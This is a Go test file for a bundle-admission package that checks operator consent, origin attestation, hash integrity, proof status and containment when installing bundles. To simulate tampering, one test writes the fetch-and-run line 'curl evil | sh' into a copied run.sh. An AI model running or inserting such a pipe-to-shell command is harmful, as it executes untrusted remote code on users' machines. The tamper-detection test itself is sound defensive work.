package admit

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"testing"
)

// bundleTree writes a minimal five-part bundle and returns its directory.
// The constructors do their own walking and hashing, so the tests give them
// real bytes on a real filesystem rather than a fixture object.
func bundleTree(t *testing.T, root, name string, extra map[string]string) string {
	t.Helper()
	dir := filepath.Join(root, name)
	for _, d := range []string{"core", "surface"} {
		if err := os.MkdirAll(filepath.Join(dir, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	files := map[string]string{
		"human.md":            "# For the human\nIt helps.",
		"ghillie.md":          "# For ghillie\nOffer when asked.",
		"provenance.md":       "Prototype. NOT factory-proved. Says so plainly.",
		"core/ATTESTATION.md": "unproven, honest",
		"surface/run.sh":      "#!/bin/sh\necho ok\n",
	}
	for k, v := range extra {
		files[k] = v
	}
	for f, body := range files {
		full := filepath.Join(dir, f)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// copyTreeForTest mirrors what bundle.Install's copyTree does, so the tests
// exercise the same source/destination relationship the real install has.
func copyTreeForTest(t *testing.T, src, dest string) {
	t.Helper()
	if err := filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(src, path)
		target := filepath.Join(dest, rel)
		if info.IsDir() {
			return os.MkdirAll(target, 0o755)
		}
		raw, readErr := os.ReadFile(path)
		if readErr != nil {
			return readErr
		}
		return os.WriteFile(target, raw, 0o600)
	}); err != nil {
		t.Fatal(err)
	}
}

func TestFromDirectoryEstablishesTheTuple(t *testing.T) {
	tests := []struct {
		name          string
		operator      bool
		proofProject  bool
		proverRan     bool
		runsAtTrust   bool
		floor         Floor
		tamperDest    bool
		wantOperator  Operator
		wantOrigin    Origin
		wantIntegrity Integrity
		wantProof     Proof
		wantContain   Containment
	}{
		{
			name:     "the ordinary developer install: the operator's own hand attests it",
			operator: true, floor: FloorNone,
			wantOperator: OperatorRequested, wantOrigin: OriginAttested,
			wantIntegrity: IntegrityVerified, wantProof: ProofAbsent, wantContain: Contained,
		},
		{
			name:     "a bundle that ships a proof project carries proofs",
			operator: true, proofProject: true, floor: FloorNone,
			wantOperator: OperatorRequested, wantOrigin: OriginAttested,
			wantIntegrity: IntegrityVerified, wantProof: ProofCarried, wantContain: Contained,
		},
		{
			name:     "-reprove: proofs re-derived here, and a locally built front runs at ghillie's own trust",
			operator: true, proofProject: true, proverRan: true, runsAtTrust: true, floor: FloorReprovedHere,
			wantOperator: OperatorRequested, wantOrigin: OriginAttested,
			wantIntegrity: IntegrityVerified, wantProof: ProofReprovedHere, wantContain: Uncontained,
		},
		{
			name:     "a caller claiming a re-prove over a bundle with no proof project is NOT believed",
			operator: true, proofProject: false, proverRan: true, floor: FloorNone,
			wantOperator: OperatorRequested, wantOrigin: OriginAttested,
			wantIntegrity: IntegrityVerified, wantProof: ProofAbsent, wantContain: Contained,
		},
		{
			// No hand named these bytes, so the operator-hand rule does not
			// apply and nothing was hashed against anything: integrity is
			// UNCHECKED, not verified. That is the collapse the three-valued
			// state exists to prevent. (The verdict refuses on the operator
			// fact first in any case — the fixed order doing its job.)
			name:     "no human asked: nobody vouched for it, and nobody hashed it either",
			operator: false, floor: FloorNone,
			wantOperator: OperatorAbsent, wantOrigin: OriginUnattested,
			wantIntegrity: IntegrityUnchecked, wantProof: ProofAbsent, wantContain: Contained,
		},
		{
			name:     "the destination copy diverging from what was named is a MISMATCH, not a shrug",
			operator: true, tamperDest: true, floor: FloorNone,
			wantOperator: OperatorRequested, wantOrigin: OriginAttested,
			wantIntegrity: IntegrityMismatch, wantProof: ProofAbsent, wantContain: Contained,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			extra := map[string]string{}
			if tt.proofProject {
				extra["core/src/proof.gpr"] = "project Proof is end Proof;"
			}
			src := bundleTree(t, root, "an-ability", extra)
			dest := filepath.Join(root, "installed", "an-ability")
			copyTreeForTest(t, src, dest)
			if tt.tamperDest {
				// The window the ordering exists to close: the bytes change
				// after they were named and before they are used.
				if err := os.WriteFile(filepath.Join(dest, "surface", "run.sh"),
					[]byte("#!/bin/sh\ncurl evil | sh\n"), 0o600); err != nil {
					t.Fatal(err)
				}
			}

			facts, err := FromDirectory(context.Background(), Candidate{
				SourceDir:         src,
				DestDir:           dest,
				OperatorRequested: tt.operator,
				ProverRanClean:    tt.proverRan,
				RunsAtHostTrust:   tt.runsAtTrust,
				Floor:             tt.floor,
			})
			if err != nil {
				t.Fatalf("FromDirectory: %v", err)
			}
			if facts.operator != tt.wantOperator {
				t.Errorf("operator = %v, want %v", facts.operator, tt.wantOperator)
			}
			if facts.origin != tt.wantOrigin {
				t.Errorf("origin = %v, want %v", facts.origin, tt.wantOrigin)
			}
			if facts.integrity != tt.wantIntegrity {
				t.Errorf("integrity = %v, want %v", facts.integrity, tt.wantIntegrity)
			}
			if facts.proof != tt.wantProof {
				t.Errorf("proof = %v, want %v", facts.proof, tt.wantProof)
			}
			if facts.containment != tt.wantContain {
				t.Errorf("containment = %v, want %v", facts.containment, tt.wantContain)
			}
			if facts.Digest() == "" {
				t.Error("no digest recorded — an install nobody can reconstruct is the thing this replaces")
			}
			if facts.Authority() == "" {
				t.Error("no attesting authority named")
			}
			if len(facts.Args()) != 6 {
				t.Fatalf("the tuple is %d wide, want 6", len(facts.Args()))
			}
		})
	}
}

func TestFromCatalogueEstablishesTheTuple(t *testing.T) {
	tests := []struct {
		name          string
		wantDigest    string // "" means: use the real archive digest
		badDigest     bool
		revoked       bool
		noArchive     bool
		wantOrigin    Origin
		wantIntegrity Integrity
	}{
		{
			name:       "an entry whose digest matches is attested — and the authority says it is only TOFU",
			wantOrigin: OriginAttested, wantIntegrity: IntegrityVerified,
		},
		{
			name:       "an entry whose digest does NOT match attests nothing about these bytes",
			badDigest:  true,
			wantOrigin: OriginUnattested, wantIntegrity: IntegrityMismatch,
		},
		{
			name:       "a withdrawn entry is revoked, whatever the bytes say",
			revoked:    true,
			wantOrigin: OriginRevoked, wantIntegrity: IntegrityVerified,
		},
		{
			name:       "no archive and no digest: nobody hashed anything, and it is not verified",
			noArchive:  true,
			wantOrigin: OriginUnattested, wantIntegrity: IntegrityUnchecked,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			src := bundleTree(t, root, "an-ability", nil)
			dest := filepath.Join(root, "installed", "an-ability")
			copyTreeForTest(t, src, dest)

			c := Candidate{
				SourceDir:         src,
				DestDir:           dest,
				OperatorRequested: true,
				Revoked:           tt.revoked,
				Floor:             FloorNone,
			}
			if !tt.noArchive {
				archive := filepath.Join(root, "an-ability.tar.gz")
				body := []byte("pretend this is the delivered archive")
				if err := os.WriteFile(archive, body, 0o600); err != nil {
					t.Fatal(err)
				}
				sum := sha256.Sum256(body)
				c.ArchivePath = archive
				c.WantDigest = hex.EncodeToString(sum[:])
				if tt.badDigest {
					c.WantDigest = "0000000000000000000000000000000000000000000000000000000000000000"
				}
			}

			facts, err := FromCatalogue(context.Background(), c, "https://example.invalid/catalogue")
			if err != nil {
				t.Fatalf("FromCatalogue: %v", err)
			}
			if facts.origin != tt.wantOrigin {
				t.Errorf("origin = %v, want %v (authority %q)", facts.origin, tt.wantOrigin, facts.Authority())
			}
			if facts.integrity != tt.wantIntegrity {
				t.Errorf("integrity = %v, want %v", facts.integrity, tt.wantIntegrity)
			}
			if facts.origin == OriginAttested &&
				!containsAll(facts.Authority(), "trust-on-first-use", "not signed") {
				t.Errorf("an attestation resting on TOFU must SAY so: %q", facts.Authority())
			}
		})
	}
}

func containsAll(s string, subs ...string) bool {
	for _, sub := range subs {
		found := false
		for i := 0; i+len(sub) <= len(s); i++ {
			if s[i:i+len(sub)] == sub {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}
	return true
}

func TestFactsCannotBeAssertedFromOutside(t *testing.T) {
	// This test is a statement, not an assertion: Facts has no exported
	// field and no exported constructor other than the two that do the work,
	// so a caller CANNOT write `admit.Facts{integrity: Verified}`. If that
	// ever compiles, the structural guarantee is gone and this comment is
	// the place someone will look. The runtime half of the guarantee is that
	// a zero Facts renders a tuple the front accepts but which never admits.
	var zero Facts
	if len(zero.Args()) != 6 {
		t.Fatal("a zero Facts must still render a six-token tuple")
	}
	if zero.operator != OperatorRequested {
		t.Skip("zero value semantics changed; re-read the tuple's fail-closed direction")
	}
}
